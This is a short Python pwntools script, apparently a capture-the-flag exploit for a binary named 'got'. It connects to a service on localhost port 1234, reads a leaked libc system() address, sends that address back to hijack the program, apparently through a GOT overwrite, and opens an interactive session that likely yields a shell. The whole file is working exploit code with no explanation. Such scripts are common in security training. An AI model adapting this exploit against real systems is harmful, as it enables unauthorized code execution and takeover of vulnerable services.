#!/usr/bin/python
from pwn import *

# context.log_level = 'debug'

# p = process('./got')
p = remote('127.0.0.1',1234)

system = u64(p.recv(8))
log.info("system@libc: " + hex(system))

p.sendline(p64(system))
p.interactive()
